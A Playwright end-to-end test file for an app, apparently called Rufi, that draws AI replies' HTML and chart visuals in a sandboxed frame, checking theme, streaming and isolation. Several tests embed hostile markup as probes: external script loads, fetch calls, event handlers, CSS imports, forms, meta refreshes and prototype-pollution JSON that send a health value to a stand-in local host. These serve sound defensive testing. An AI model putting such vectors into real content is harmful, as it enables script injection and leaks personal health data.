// A reply's visual (ADR 0034), on the real core with its real headers: the
// AI's HTML in a `rufi-visual` block draws in its locked frame, in Rufi's
// theme and at its own height, waits while its block is written and never
// reloads as the reply goes on; it runs no script of its own and reaches
// neither the network nor Rufi's page; one that tries says part of it didn't
// load; and one that starts above what you read and grows keeps your place.
import { AxeBuilder } from "@axe-core/playwright";
import { subscribe, unsubscribe } from "node:diagnostics_channel";
import { createServer, type IncomingMessage, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import type { Frame, Locator, Page } from "@playwright/test";
import { expect, openSettings, test, type Rufi } from "./rufi.ts";

// The CSP's refusals in Rufi's own page.
test.beforeEach(async ({ context }) => {
  await context.addInitScript(() => {
    const refused: string[] = [];
    Object.assign(globalThis, { refused });
    (globalThis as unknown as EventTarget).addEventListener(
      "securitypolicyviolation",
      (event) => {
        const { violatedDirective, blockedURI } = event as Event & {
          violatedDirective: string;
          blockedURI: string;
        };
        refused.push(`${violatedDirective} ${blockedURI}`);
      },
    );
  });
});
const refusedIn = (page: Page) =>
  page.evaluate(() => (globalThis as unknown as { refused: string[] }).refused);

const chat = (page: Page) => page.getByRole("region", { name: "Chat" });
const log = (page: Page) => chat(page).getByRole("log", { name: "Messages" });
const cards = (page: Page) =>
  log(page).locator(".reply iframe[title='Visual']");

async function opened(
  page: Page,
  rufi: Rufi,
  options?: Parameters<Rufi["start"]>[0],
) {
  await rufi.family();
  await rufi.start(options);
  await page.goto(rufi.link());
  await expect(
    page.getByRole("heading", { name: "Health record" }),
  ).toBeVisible();
}

/** Sends a message; the scripted Codex answers "ok:" and the message. */
async function send(page: Page, text: string) {
  const opener = chat(page).getByRole("button", { name: "Open the chat" });
  const box = chat(page).getByRole("textbox", { name: "Message to Rufi" });
  await expect(opener.or(box).first()).toBeVisible();
  if (await opener.isVisible()) await opener.click();
  await box.fill(text);
  await box.press("Enter");
  await expect(box).toHaveValue("");
}

/** A reply with `html` as its visual, between two lines of text. */
const withVisual = (html: string, after = "As your record keeps it.") =>
  `Your HbA1c, drawn:\n\n\`\`\`rufi-visual\n${html}\n\`\`\`\n\n${after}`;

async function frameOf(card: Locator): Promise<Frame> {
  const frame = await (await card.elementHandle()).contentFrame();
  if (!frame) throw new Error("The visual has no frame.");
  return frame;
}

/** The colour Rufi's page gives `token` now, as a computed colour. */
const pageColour = (page: Page, token: string) =>
  page.evaluate((name) => {
    const probe = document.createElement("span");
    probe.style.color = `var(${name})`;
    document.body.append(probe);
    const colour = getComputedStyle(probe).color;
    probe.remove();
    return colour;
  }, token);

test("a visual draws in the reply in Rufi's theme at its own height, doesn't reload as the reply's text goes on, follows a new theme without reloading, and stays drawn once the reply ends", async ({
  page,
  rufi,
}) => {
  await opened(page, rufi);
  const chart = [
    '<div id="chart" style="height:300px;color:var(--ink)">',
    '<svg viewBox="0 0 100 50" width="100%"><circle cx="20" cy="25" r="5" fill="var(--accent)"/></svg>',
    "</div>",
  ].join("\n");
  // The reply streams in small parts: the text after the visual goes on
  // after the visual draws, paragraph by paragraph, well before it ends.
  const more = "These are the values your record keeps. ".repeat(15);
  // A source cited before the visual, defined at the reply's end.
  const after = `${more}halfway.\n\n${more}trickle end.\n\n[lab]: rufi:/documents/fictional-doc`;
  await send(
    page,
    withVisual(chart, after).replace(
      "Your HbA1c, drawn:",
      "Your HbA1c, drawn ([Sunrise Labs][lab]):",
    ),
  );
  const card = cards(page);
  const inside = page.frameLocator(".reply iframe[title='Visual']");
  await expect(inside.locator("circle")).toBeVisible({ timeout: 15_000 });
  // When the visual's document began: the same while it isn't reloaded.
  const began = async () =>
    (await frameOf(card)).evaluate(() => performance.timeOrigin);
  const loaded = await began();
  await expect(log(page).locator(".reply").getByText("halfway.")).toBeVisible();
  expect(await began()).toBe(loaded);
  // Once the reply ends, the visual is still drawn: its line may move in
  // the chat, and a frame the browser loads again gets it again.
  await expect(
    log(page).locator(".reply").getByText("trickle end."),
  ).toBeVisible();
  await expect(log(page)).toHaveAttribute("aria-busy", "false");
  await expect(inside.locator("circle")).toBeVisible();
  const ended = await began();
  // At its own height, with nothing to scroll inside.
  await expect
    .poll(() =>
      card.evaluate((element) => element.getBoundingClientRect().height),
    )
    .toBe(300);
  // In Rufi's colours.
  const ink = async () =>
    (await frameOf(card)).evaluate(
      () => getComputedStyle(document.getElementById("chart") as Element).color,
    );
  expect(await ink()).toBe(await pageColour(page, "--ink"));
  // The block shows as the visual, not as its code.
  await expect(log(page).locator(".reply pre")).toHaveCount(0);
  await expect(
    log(page).locator(".reply").getByText("Your HbA1c, drawn"),
  ).toBeVisible();
  // The reply is one document: the source is a link.
  await expect(
    log(page).locator(".reply").getByRole("link", { name: "Sunrise Labs" }),
  ).toHaveAttribute("href", /\/documents\/fictional-doc$/);

  // Dark: the same document takes the new colours.
  const light = await ink();
  await page.evaluate(() => {
    document.documentElement.dataset["appearance"] = "dark";
  });
  await expect.poll(ink).not.toBe(light);
  expect(await ink()).toBe(await pageColour(page, "--ink"));
  expect(await began()).toBe(ended);
  expect(await card.count()).toBe(1);

  await expect(
    log(page).getByText("Part of this visual didn't load"),
  ).toHaveCount(0);
  const { violations } = await new AxeBuilder({ page }).analyze();
  expect(violations.map((violation) => violation.id)).toEqual([]);
  expect(await refusedIn(page)).toEqual([]);
});

test("a visual still being written never shows its code: paragraph by paragraph it waits, word by word it holds its place quietly", async ({
  page,
  rufi,
}) => {
  await opened(page, rufi, {
    scenario: {
      answer: 'Here is your chart.\n\n```rufi-visual\n<p id="half">Half',
    },
  });
  await send(page, "partial");
  await expect(log(page).getByText("Here is your chart.")).toBeVisible();
  await expect(log(page).locator(".reply .visual")).toHaveCount(0);
  await expect(log(page).locator(".reply pre")).toHaveCount(0);
  await expect(log(page).getByText("Half")).toHaveCount(0);

  // Word by word, after a reload: the visual's place, quietly.
  const settings = await openSettings(page, "Chat");
  await settings.getByRole("radio", { name: "Word by word" }).check();
  await page.keyboard.press("Escape");
  await page.reload();
  const opener = chat(page).getByRole("button", { name: "Open the chat" });
  await expect(opener.or(log(page)).first()).toBeVisible();
  if (await opener.isVisible()) await opener.click();
  await expect(log(page).getByText("Here is your chart.")).toBeVisible();
  await expect(log(page).locator(".reply .visual[aria-hidden]")).toBeVisible();
  await expect(cards(page)).toHaveCount(0);
  await expect(log(page).locator(".reply pre")).toHaveCount(0);
  await expect(log(page).getByText("Half")).toHaveCount(0);
});

test("a visual runs no script of its own and reaches neither the network nor Rufi's page; one that tries says part of it didn't load", async ({
  page,
  rufi,
}) => {
  // Also in WebKit (the iPhone's engine), whose link hints connect whatever
  // a policy says.
  // Anything that reaches here got out, whatever it was.
  const reached: string[] = [];
  const outside: Server = createServer((request, response) => {
    reached.push(request.url ?? "");
    response.end("out");
  });
  // A connection counts, even one that never sends a request.
  outside.on("connection", () => reached.push("a connection"));
  await new Promise<void>((resolve) => outside.listen(0, "127.0.0.1", resolve));
  const out = `http://127.0.0.1:${String((outside.address() as AddressInfo).port)}`;
  try {
    await opened(page, rufi);
    // Rufi's own scripts, whose hashes the policy allows: the page's, the
    // card script and the visual's own.
    const response = await page.request.get(
      new URL("/visual-frame.html", page.url()).href,
    );
    const allowed = [
      ...(response.headers()["content-security-policy"] ?? "").matchAll(
        /'(sha256-[^']+)'/g,
      ),
    ].map((match) => match[1] ?? "");
    expect(allowed).toHaveLength(3);
    const own = allowed[0];
    const hostile = [
      '<p id="drawn">Drawn</p>',
      // As a model writes a chart: a library from a CDN, then its script.
      `<script src="${out}/chart.js"></script>`,
      // A file named by a hash the policy allows: its request would leave
      // before the file is checked.
      `<script src="${out}/values.js?hba1c=6.4" integrity="${own ?? ""}" crossorigin="anonymous"></script>`,
      `<svg><script href="${out}/drawn.js"></script></svg>`,
      `<script>document.body.dataset.ran = "yes"; fetch(${JSON.stringify(out)} + "/fetch");</script>`,
      '<img alt="" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onload="document.body.dataset.handler = \'yes\'">',
      `<img src="${out}/picture.png" alt="">`,
      `<link rel="stylesheet" href="${out}/style.css">`,
      `<link rel="prefetch" href="${out}/prefetch">`,
      `<link rel="preconnect" href="${out}">`,
      `<link rel="dns-prefetch" href="${out}">`,
      `<link rel="preload" as="script" href="${out}/preloaded.js" integrity="${own ?? ""}">`,
      `<object data="${out}/object"></object><embed src="${out}/embed">`,
      `<base href="${out}/">`,
      `<meta http-equiv="refresh" content="0;url=${out}/moved">`,
      `<style>@import url("${out}/imported.css"); #drawn { background: url("${out}/background.png"); }</style>`,
      `<iframe src="${out}/framed"></iframe>`,
      `<form action="${out}/form" method="post"><button id="post">Post</button></form>`,
      // Links: a visual has none. Their words stay.
      `<a href="${out}/followed" target="_top"><span id="away">Away</span></a>`,
      `<a href="${out}/values?hba1c=6.4" target="_blank"><span id="blank">View values</span></a>`,
      `<a href="/visual-frame.html?hba1c=6.4"><span id="own">Chart</span></a>`,
      `<a href="/api/people?hba1c=6.4"><span id="api">Values</span></a>`,
      `<svg width="40" height="20"><a href="${out}/drawn-link"><text id="svg-link" y="15">Dot</text></a></svg>`,
      `<img id="mapped" usemap="#map" width="20" height="20" alt="" src="data:image/gif;base64,R0lGODlhAQABAAAAACw="><map name="map"><area shape="rect" coords="0,0,20,20" href="${out}/area?hba1c=6.4" target="_blank" alt="Area"></map>`,
    ].join("\n");
    // Rufi's own address, reached from the visual with a value.
    const toRufi: string[] = [];
    page.on("request", (request) => {
      const { origin, search } = new URL(request.url());
      if (origin === new URL(page.url()).origin && search.includes("hba1c=")) {
        toRufi.push(request.url());
      }
    });
    await send(page, withVisual(hostile));
    const inside = page.frameLocator(".reply iframe[title='Visual']");
    await expect(inside.getByText("Drawn")).toBeVisible();
    await expect(
      log(page).getByText("Part of this visual didn't load"),
    ).toBeVisible();

    // None of the AI's script ran, and the visual has nothing of Rufi's
    // page, session or storage.
    const frame = await frameOf(cards(page));
    expect(
      await frame.evaluate(() => {
        const tried = (what: () => unknown) => {
          try {
            return String(what());
          } catch {
            return "refused";
          }
        };
        return {
          ran: document.body.dataset["ran"] ?? "no",
          handler: document.body.dataset["handler"] ?? "no",
          page: tried(() => window.parent.document.title),
          cookie: tried(() => document.cookie),
          storage: tried(() => localStorage.length),
        };
      }),
    ).toEqual({
      ran: "no",
      handler: "no",
      page: "refused",
      cookie: "refused",
      storage: "refused",
    });
    // A form or a link in it goes nowhere: its links are words only.
    await expect(inside.locator("a, area")).toHaveCount(0);
    await inside.locator("#post").click();
    // Rufi's own addresses last: were they links, the frame would leave.
    for (const words of [
      "#away",
      "#blank",
      "#svg-link",
      "#mapped",
      "#own",
      "#api",
    ]) {
      await inside.locator(words).click();
    }

    // The second policy on its own: a script file named by any hash the
    // first allows, put in past the markup's guard, still never loads.
    await frame.evaluate(
      ({ out, allowed }) => {
        allowed.forEach((hash, i) => {
          const file = document.createElement("script");
          file.src = `${out}/active-${String(i)}.js?hba1c=6.4`;
          file.integrity = hash;
          file.crossOrigin = "anonymous";
          document.body.append(file);
        });
      },
      { out, allowed },
    );
    await page.waitForTimeout(1000);

    expect(reached).toEqual([]);
    expect(toRufi).toEqual([]);
    expect(page.context().pages()).toHaveLength(1);
    await expect(
      page.getByRole("heading", { name: "Health record" }),
    ).toBeVisible();
    // Rufi's page refused only a frame's move.
    for (const refusal of await refusedIn(page)) {
      expect(refusal).toMatch(/^frame-src /);
    }
  } finally {
    outside.closeAllConnections();
    await new Promise((resolve) => outside.close(resolve));
  }
});

test("Tailwind in a visual reaches neither the network nor Rufi's page: the browser refuses each import and web address it writes, and Tailwind refuses a plugin", async ({
  page,
  rufi,
}) => {
  // Also in WebKit. Tailwind writes a web import or a class's url() into
  // the CSS it makes, and the frame's policy refuses it: each probe waits
  // for the browser's refusal of its own address, so it proves the browser
  // tried. An import is valid only before Rufi's theme, so the test puts
  // each import's input there, past the markup's guard; a visual's own
  // import comes after the theme, where the browser ignores it.
  const reached: string[] = [];
  const outside: Server = createServer((request, response) => {
    reached.push(request.url ?? "");
    response.end("out");
  });
  outside.on("connection", () => reached.push("a connection"));
  await new Promise<void>((resolve) => outside.listen(0, "127.0.0.1", resolve));
  const out = `http://127.0.0.1:${String((outside.address() as AddressInfo).port)}`;
  // Rufi's own address, reached from the visual with a value.
  const toRufi = arrivalsAtRufi(() => new URL(page.url()).host);
  try {
    await opened(page, rufi);
    const own = new URL(page.url()).origin;
    // Each in its own visual, so one that stops Tailwind can't keep
    // another from being reached.
    const probes: { words: string; input?: string; classes?: string }[] = [
      { words: "Imported", input: `@import "${out}/tw-import.css?hba1c=6.4";` },
      { words: "Imported by url", input: `@import url("${out}/tw-url.css");` },
      {
        words: "Imported from Rufi",
        input: `@import "${own}/tw-own.css?hba1c=6.4";`,
      },
      {
        words: "Classes",
        classes: `bg-[url(${out}/tw-background.png)] [mask-image:url(${own}/tw-mask.png?hba1c=6.4)]`,
      },
    ];
    const refusedFor = [
      [`${out}/tw-import.css?hba1c=6.4`],
      [`${out}/tw-url.css`],
      [`${own}/tw-own.css?hba1c=6.4`],
      [`${out}/tw-background.png`, `${own}/tw-mask.png?hba1c=6.4`],
    ];
    for (const { words } of probes) {
      await send(page, withVisual(`<p id="probe">${words}</p>`));
    }
    // A plugin, in the visual's own Tailwind.
    await send(
      page,
      withVisual(
        `<p id="probe">Plugin</p><style type="text/tailwindcss">@plugin "${out}/tw-plugin.js";</style>`,
      ),
    );
    await expect(cards(page)).toHaveCount(probes.length + 1);
    for (const [at, probe] of probes.entries()) {
      const card = cards(page).nth(at);
      await expect(
        card.contentFrame().getByText(probe.words, { exact: true }),
      ).toBeVisible({ timeout: 15_000 });
      const frame = await frameOf(card);
      await frame.evaluate(({ input, classes }) => {
        const refused: string[] = [];
        (window as unknown as { refused: string[] }).refused = refused;
        addEventListener("securitypolicyviolation", (event) =>
          refused.push(event.blockedURI),
        );
        if (input !== undefined) {
          const style = document.createElement("style");
          style.setAttribute("type", "text/tailwindcss");
          style.textContent = input;
          document
            .querySelector('style[type="text/tailwindcss"]')
            ?.before(style);
        }
        if (classes !== undefined) {
          (document.getElementById("probe") as Element).className = classes;
        }
      }, probe);
      for (const address of refusedFor[at] ?? []) {
        await expect
          .poll(() =>
            frame.evaluate(
              () => (window as unknown as { refused: string[] }).refused,
            ),
          )
          .toContain(address);
      }
    }
    // The class's addresses reached what the probe's style is.
    const classes = await frameOf(cards(page).nth(3));
    expect(
      await classes.evaluate(() => {
        const style = getComputedStyle(
          document.getElementById("probe") as Element,
        );
        return [
          style.backgroundImage,
          style.getPropertyValue("mask-image") ||
            style.getPropertyValue("-webkit-mask-image"),
        ];
      }),
    ).toEqual([
      expect.stringContaining("tw-background.png"),
      expect.stringContaining("tw-mask.png"),
    ]);
    // Tailwind itself refuses the plugin: it loads no module at all.
    const plugin = cards(page).nth(probes.length);
    await expect(
      plugin.contentFrame().getByText("Plugin", { exact: true }),
    ).toBeVisible({ timeout: 15_000 });
    const pluginFrame = await frameOf(plugin);
    await expect
      .poll(() =>
        pluginFrame.evaluate(() =>
          performance
            .getEntriesByName("(error)")
            .map((mark) =>
              String(
                ((mark as PerformanceMark).detail as { error?: unknown } | null)
                  ?.error,
              ),
            ),
        ),
      )
      .toContain(
        "Error: The browser build does not support plugins or config files.",
      );
    await page.waitForTimeout(1000);
    expect(reached).toEqual([]);
    expect(toRufi.arrived).toEqual([]);
    await counterWorks(page, toRufi.arrived);
  } finally {
    toRufi.stop();
    outside.closeAllConnections();
    await new Promise((resolve) => outside.close(resolve));
  }
});

test("a visual is styled with Tailwind in Rufi's theme: any class, the screens' colour names, no colours of Tailwind's own, and dark as Rufi is", async ({
  page,
  rufi,
}) => {
  await opened(page, rufi);
  await send(
    page,
    withVisual(
      [
        '<div class="p-4 rounded-lg border border-line bg-surface">',
        '<p id="small" class="text-sm text-muted">Small</p>',
        '<div id="grid" class="grid grid-cols-[1fr_auto] gap-2"><span>Date</span><span>Value</span></div>',
        '<p id="red" class="bg-red-500 text-red-600">Red</p>',
        '<p id="dark" class="text-ink dark:text-accent">Dark</p>',
        "</div>",
      ].join(""),
    ),
  );
  const card = cards(page);
  await expect(
    page.frameLocator(".reply iframe[title='Visual']").getByText("Dark"),
  ).toBeVisible({ timeout: 15_000 });
  const frame = await frameOf(card);
  const style = (id: string, property: string) =>
    frame.evaluate(
      ({ id, property }) =>
        getComputedStyle(
          document.getElementById(id) as Element,
        ).getPropertyValue(property),
      { id, property },
    );
  // Tailwind builds after the visual is in, any class the AI writes: wait
  // for an arbitrary value's.
  await expect
    .poll(async () => (await style("grid", "grid-template-columns")).split(" "))
    .toHaveLength(2);
  // Rufi's colours by the screens' names; Tailwind's own have none.
  expect(await style("small", "color")).toBe(await pageColour(page, "--muted"));
  expect(await style("red", "background-color")).toBe("rgba(0, 0, 0, 0)");
  expect(await style("red", "color")).toBe(await pageColour(page, "--ink"));
  expect(await style("dark", "color")).toBe(await pageColour(page, "--ink"));
  // Dark is Rufi's, not the system's.
  await page.evaluate(() => {
    document.documentElement.dataset["appearance"] = "dark";
  });
  await expect
    .poll(() => style("dark", "color"))
    .toBe(await pageColour(page, "--accent"));
  await expect(
    log(page).getByText("Part of this visual didn't load"),
  ).toHaveCount(0);
});

/**
 * A chart's JSON block, as the AI writes it where the chart goes: a "<" in
 * its JSON escaped, as JSON may, so no closing tag ends it early.
 */
const chartBlock = (config: unknown, label?: string) =>
  `<script type="application/json" data-rufi-chart${label === undefined ? "" : ` aria-label="${label}"`}>${JSON.stringify(config).replace(/</g, "\\u003c")}</script>`;

/** What a canvas drew: its text and its round marks, where it drew them. */
interface Drawn {
  text: { text: string; x: number; y: number }[];
  marks: { x: number; y: number; r: number }[];
}

/**
 * Keeps what every canvas draws, as it draws it, in each frame of the
 * page: a chart is read where the browser draws it, not through Chart.js.
 */
const keepDrawing = (page: Page) =>
  page.addInitScript(() => {
    const drawn: Drawn = { text: [], marks: [] };
    Object.assign(globalThis, { drawn });
    const canvas = CanvasRenderingContext2D.prototype;
    const own = (name: "fillText" | "arc") =>
      Object.getOwnPropertyDescriptor(canvas, name)?.value as (
        ...args: unknown[]
      ) => void;
    const fillText = own("fillText");
    const arc = own("arc");
    canvas.fillText = function (text, x, y, width) {
      drawn.text.push({ text, x, y });
      fillText.call(this, text, x, y, width);
    };
    canvas.arc = function (x, y, r, ...rest) {
      drawn.marks.push({ x, y, r });
      arc.call(this, x, y, r, ...rest);
    };
  });

/** What the visual's canvas has drawn so far; `clear` forgets it. */
const drawnIn = (frame: Frame, clear = false) =>
  frame.evaluate((clear) => {
    const drawn = (globalThis as unknown as { drawn: Drawn }).drawn;
    const now = structuredClone(drawn);
    if (clear) Object.assign(drawn, { text: [], marks: [] });
    return now;
  }, clear);

/**
 * A chart's points, as drawn when not under the pointer: Rufi's are 3.5 px
 * round, Chart.js's own 3 px (a series the AI gave its colours).
 */
const pointsIn = async (frame: Frame) =>
  (await drawnIn(frame)).marks.filter((mark) => [3, 3.5].includes(mark.r));

/** Moves the pointer to `at` on the visual's canvas, and clicks if asked. */
async function pointAt(
  page: Page,
  card: Locator,
  at: { x: number; y: number },
  click = false,
) {
  await card.scrollIntoViewIfNeeded();
  const frame = await frameOf(card);
  const canvas = await frame.evaluate(() => {
    const box = (
      document.querySelector("canvas") as HTMLCanvasElement
    ).getBoundingClientRect();
    return { x: box.left, y: box.top };
  });
  const box = await card.boundingBox();
  const x = (box?.x ?? 0) + canvas.x + at.x;
  const y = (box?.y ?? 0) + canvas.y + at.y;
  await (click ? page.mouse.click(x, y) : page.mouse.move(x, y));
}

/**
 * Every request that arrives at Rufi's core (it runs in this process) with
 * a value in its address, counted as it arrives, before any answer.
 */
function arrivalsAtRufi(host: () => string) {
  const arrived: string[] = [];
  const listener = (message: unknown) => {
    const { request } = message as { request: IncomingMessage };
    if (request.headers.host === host() && request.url?.includes("hba1c=")) {
      arrived.push(request.url);
    }
  };
  subscribe("http.server.request.start", listener);
  return {
    arrived,
    stop: () => unsubscribe("http.server.request.start", listener),
  };
}

/** The counter sees a request that does arrive (a page of Rufi's that isn't one). */
async function counterWorks(page: Page, arrived: string[]) {
  const before = arrived.length;
  await page.evaluate(() => fetch("/api/nothing-here?hba1c=check"));
  expect(arrived.slice(before)).toEqual(["/api/nothing-here?hba1c=check"]);
}

test("a visual's chart is drawn by Rufi from its JSON: spaced by date, a tooltip of the record's own words, and a new theme without reloading", async ({
  page,
  rufi,
}) => {
  await keepDrawing(page);
  await opened(page, rufi);
  const tsh = [
    { x: "2025-03", y: 2.1, text: "2.1 mIU/L" },
    { x: "2025-09-14", y: 0.5, text: "<0.5 mIU/L" },
    { x: "2026-01-20", y: 3, text: "3.0 mIU/L" },
    // No value as printed: no tooltip.
    { x: "2026-08-12", y: 4.6 },
  ];
  await send(
    page,
    withVisual(
      [
        '<p id="words">TSH over time</p>',
        chartBlock(
          {
            type: "line",
            data: {
              datasets: [
                {
                  label: "TSH",
                  data: tsh,
                  // A series' own callbacks: Rufi's tooltip still.
                  tooltip: {
                    callbacks: { title: "return 'x'", label: "return 'x'" },
                  },
                },
              ],
            },
            options: { scales: { x: { type: "time" } } },
          },
          "TSH over time",
        ),
      ].join(""),
    ),
  );
  // A horizontal bar of a month: its date is on y.
  await send(
    page,
    withVisual(
      chartBlock({
        type: "bar",
        data: {
          datasets: [
            {
              label: "Ferritin",
              data: [{ x: 0.5, y: "2025-03", text: "<0.5 mg/dL" }],
            },
          ],
        },
        options: {
          indexAxis: "y",
          scales: { y: { type: "time" } },
          interaction: { intersect: false },
        },
      }),
    ),
  );
  const card = cards(page).first();
  await expect(
    card.contentFrame().getByRole("img", { name: "TSH over time" }),
  ).toBeVisible({ timeout: 15_000 });
  const frame = await frameOf(card);
  await expect.poll(async () => (await pointsIn(frame)).length).toBe(4);

  // Spaced by date: 1 Mar to 14 Sep 2025 is 197 days, to 20 Jan 2026 128.
  const [a, b, c, textless] = await pointsIn(frame);
  if (!a || !b || !c || !textless) throw new Error("No points.");
  expect((b.x - a.x) / (c.x - b.x)).toBeCloseTo(197 / 128, 1);

  // The tooltip, as the pointer brings it: the date as written, at its
  // precision, and the value as printed.
  const tooltip = async (at: { x: number; y: number }) => {
    await drawnIn(frame, true);
    await pointAt(page, card, at);
  };
  const texts = async () => (await drawnIn(frame)).text.map((t) => t.text);
  await tooltip(b);
  await expect
    .poll(texts)
    .toEqual(expect.arrayContaining(["14 Sep 2025", "TSH: <0.5 mIU/L"]));
  await tooltip(a);
  await expect
    .poll(texts)
    .toEqual(expect.arrayContaining(["Mar 2025", "TSH: 2.1 mIU/L"]));
  // None for a point with no value as printed.
  await tooltip(textless);
  await expect.poll(async () => (await texts()).length).toBeGreaterThan(0);
  await page.waitForTimeout(300);
  expect((await texts()).filter((text) => text.startsWith("TSH:"))).toEqual([]);

  // A horizontal bar's tooltip takes its month from y.
  const bar = cards(page).nth(1);
  const barFrame = await frameOf(bar);
  await expect
    .poll(async () => (await drawnIn(barFrame)).text.length)
    .toBeGreaterThan(0);
  const size = await barFrame.evaluate(() => {
    const box = (
      document.querySelector("canvas") as HTMLCanvasElement
    ).getBoundingClientRect();
    return { x: box.width / 2, y: box.height / 2 };
  });
  await drawnIn(barFrame, true);
  await pointAt(page, bar, size);
  await expect
    .poll(async () => (await drawnIn(barFrame)).text.map((t) => t.text))
    .toEqual(expect.arrayContaining(["Mar 2025", "Ferritin: <0.5 mg/dL"]));

  // A new theme: dark, another colour, a bigger text size. The chart is
  // drawn again in it, without reloading.
  const began = await frame.evaluate(() => performance.timeOrigin);
  await page.mouse.move(0, 0);
  await drawnIn(frame, true);
  await page.evaluate(() => {
    document.documentElement.dataset["appearance"] = "dark";
    document.documentElement.dataset["colour"] = "plum";
    document.documentElement.dataset["textSize"] = "larger";
  });
  await expect.poll(async () => (await pointsIn(frame)).length).toBe(4);
  expect(await frame.evaluate(() => performance.timeOrigin)).toBe(began);
  await expect(
    log(page).getByText("Part of this visual didn't load"),
  ).toHaveCount(0);
});

test("a visual's chart JSON reaches neither the network nor Rufi's page: nothing in it runs, and a chart Rufi can't draw says part of it didn't load", async ({
  page,
  rufi,
}) => {
  // Also in WebKit. Each in its own visual, so one that fails can't keep
  // another from being reached.
  const reached: string[] = [];
  const outside: Server = createServer((request, response) => {
    reached.push(request.url ?? "");
    response.end("out");
  });
  outside.on("connection", () => reached.push("a connection"));
  await new Promise<void>((resolve) => outside.listen(0, "127.0.0.1", resolve));
  const out = `http://127.0.0.1:${String((outside.address() as AddressInfo).port)}`;
  const toRufi = arrivalsAtRufi(() => new URL(page.url()).host);
  const ran = "document.body.dataset.ran = 'yes'";
  const point = { x: "2026-01-01", y: 1, text: "1" };
  const hostile = `<img src=x onerror="${ran}"></script><b>`;
  try {
    await keepDrawing(page);
    await opened(page, rufi);
    const own = new URL(page.url()).origin;
    // Each: its words, its block, and whether Rufi draws it.
    const probes: { words: string; block: string; draws: boolean }[] = [
      {
        words: "Not JSON",
        block:
          '<script type="application/json" data-rufi-chart>{"type": "line",</script>',
        draws: false,
      },
      {
        words: "A pie",
        block: chartBlock({
          type: "pie",
          data: { datasets: [{ data: [1, 2] }] },
        }),
        draws: false,
      },
      {
        // A closing tag cuts the block short: it is no longer JSON.
        words: "Cut short",
        block: `<script type="application/json" data-rufi-chart>{"type":"bar","data":{"labels":["</script><img src="${out}/after.png" alt="">"],"datasets":[{"data":[1]}]}}</script>`,
        draws: false,
      },
      {
        // Markup as text in valid JSON: Chart.js draws it as words.
        words: "Markup",
        block: chartBlock({
          type: "line",
          data: {
            datasets: [{ label: hostile, data: [{ ...point, text: hostile }] }],
          },
          options: { scales: { x: { type: "time" } } },
        }),
        draws: true,
      },
      {
        words: "Callbacks",
        block: chartBlock({
          type: "line",
          data: { datasets: [{ label: "x", data: [point] }] },
          options: {
            plugins: {
              tooltip: { callbacks: { label: ran, title: ran } },
              legend: { onClick: ran },
            },
            scales: { x: { type: "time" }, y: { ticks: { callback: ran } } },
            onHover: ran,
          },
        }),
        draws: true,
      },
      {
        words: "Prototype",
        block: `<script type="application/json" data-rufi-chart>{"type":"line","data":{"datasets":[{"label":"p","data":[{"x":1,"y":1,"text":"1"}],"__proto__":{"polluted":"yes"}}]},"options":{"__proto__":{"polluted":"yes"},"plugins":{"constructor":{"prototype":{"polluted":"yes"}},"tooltip":{"__proto__":{"polluted":"yes"}}}}}</script>`,
        draws: true,
      },
      {
        words: "Plugins",
        block: chartBlock({
          type: "line",
          data: { datasets: [{ label: "x", data: [point] }] },
          options: { scales: { x: { type: "time" } } },
          plugins: [{ id: "mine", beforeDraw: ran, afterDraw: ran }],
        }),
        draws: true,
      },
      {
        words: "Addresses",
        block: chartBlock({
          type: "line",
          data: {
            datasets: [
              {
                label: `${out}/label`,
                data: [point],
                backgroundColor: `url(${out}/fill.png)`,
              },
            ],
          },
          options: {
            scales: { x: { type: "time" } },
            plugins: {
              title: { display: true, text: `${out}/title` },
              legend: {
                labels: { font: { family: `url(${own}/font.woff?hba1c=6.4)` } },
              },
            },
            font: { family: `url(${out}/font.woff)` },
          },
        }),
        draws: true,
      },
    ];
    for (const { words, block } of probes) {
      await send(page, withVisual(`<p id="words">${words}</p>${block}`));
    }
    await expect(cards(page)).toHaveCount(probes.length);
    for (const [at, { words, draws }] of probes.entries()) {
      const card = cards(page).nth(at);
      const broken = card
        .locator("..")
        .getByText("Part of this visual didn't load");
      // Its words still show.
      await expect(
        card.contentFrame().getByText(words, { exact: true }),
      ).toBeVisible({ timeout: 15_000 });
      if (!draws) {
        // This visual's own: part of it didn't load.
        await expect(broken).toBeVisible({ timeout: 15_000 });
        continue;
      }
      // It drew, with its point; the pointer on the point brings Rufi's
      // tooltip, whatever callbacks the JSON had.
      const frame = await frameOf(card);
      await card.scrollIntoViewIfNeeded();
      await expect
        .poll(async () => (await pointsIn(frame)).length, { message: words })
        .toBe(1);
      const [spot] = await pointsIn(frame);
      if (!spot) throw new Error("No point.");
      await drawnIn(frame, true);
      await pointAt(page, card, spot);
      await expect
        .poll(async () => (await drawnIn(frame)).text.map((t) => t.text))
        .toEqual(
          expect.arrayContaining([expect.stringMatching(/: (1|<img.*)$/)]),
        );
      // A tap on the point, and on its legend's words.
      await pointAt(page, card, spot, true);
      const legend = (await drawnIn(frame)).text.find(({ text }) =>
        [hostile, "x", "p", `${out}/label`].includes(text),
      );
      if (!legend) throw new Error("No legend.");
      await drawnIn(frame, true);
      await pointAt(page, card, { x: legend.x + 4, y: legend.y }, true);
      if (words === "Markup") {
        // Its legend's markup is its words, and a tap there hides the
        // series, as Chart.js does: the legend was reached.
        await expect
          .poll(async () => (await drawnIn(frame)).text.length)
          .toBeGreaterThan(0);
        expect(await pointsIn(frame)).toEqual([]);
      }
      await expect(broken).toHaveCount(0);
    }
    // Nothing of the JSON ran, and nothing was polluted.
    for (const at of probes.keys()) {
      const frame = await frameOf(cards(page).nth(at));
      expect(
        await frame.evaluate(() => ({
          ran: document.body.dataset["ran"] ?? "no",
          polluted: "polluted" in {},
          images: document.querySelectorAll("img[onerror]").length,
        })),
      ).toEqual({ ran: "no", polluted: false, images: 0 });
    }
    await page.waitForTimeout(1000);
    expect(reached).toEqual([]);
    expect(toRufi.arrived).toEqual([]);
    await counterWorks(page, toRufi.arrived);
    expect(page.context().pages()).toHaveLength(1);
  } finally {
    toRufi.stop();
    outside.closeAllConnections();
    await new Promise((resolve) => outside.close(resolve));
  }
});

test("a visual that starts above what you read and grows keeps your place", async ({
  page,
  rufi,
}) => {
  await opened(page, rufi);
  await send(page, withVisual('<div style="height:120px"></div>'));
  const card = cards(page);
  await expect
    .poll(() =>
      card.evaluate((element) => element.getBoundingClientRect().height),
    )
    .toBe(120);
  await send(
    page,
    `Further words. ${"A plain line of made-up words. ".repeat(120)}`,
